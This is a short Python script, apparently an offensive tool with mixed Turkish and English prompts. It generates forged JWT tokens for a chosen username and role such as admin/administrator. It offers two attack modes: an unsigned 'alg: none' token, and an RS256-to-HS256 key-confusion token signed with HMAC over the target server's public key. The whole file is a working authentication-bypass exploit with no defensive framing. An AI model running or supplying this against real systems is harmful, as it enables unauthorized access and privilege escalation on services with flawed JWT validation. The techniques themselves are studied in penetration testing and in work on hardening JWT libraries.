import json, hashlib, base64, hmac
def b64_encode(data):
  return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
username = input("[?] Target username (example: admin): ")
role = input("[?] Target Role (example: administrator): ")
target_payload = {
    "user": username,
    "role": role
}
print("\n--- MOD SELECTİON---")
print("[1] 'None' Algoritması Modu")
print("[2] 'Key Confusion' (RS256 -> HS256) Modu")
choice = input("[?] Which vulnerability do you want to test?(1 veya 2): ")
if choice == "1":
    header_none = {"alg": "none", "typ": "JWT"}
    jwt_none_exploit = f"{b64_encode(header_none)}.{b64_encode(target_payload)}."
    
    print("\n[+] Generated 'None' JWT Token:")
    print(jwt_none_exploit)

elif choice == "2":
    header_hs256 = {"alg": "HS256", "typ": "JWT"}
    
    pk_input = input("[?] Enter the target server's Public Key: ")
    public_key = pk_input.encode()
    
    message = f"{b64_encode(header_hs256)}.{b64_encode(target_payload)}".encode()
    
    signature = hmac.new(public_key, message, hashlib.sha256).digest()
    b64_signature = base64.urlsafe_b64encode(signature).decode().rstrip("=")
    
    jwt_confusion_exploit = f"{message.decode()}.{b64_signature}"
    
    print("\n[+] Generated 'Key Confusion' JWT Token:")
    print(jwt_confusion_exploit)

else:
    print("\n[-] Invalid choice. Please enter either 1 or 2.")
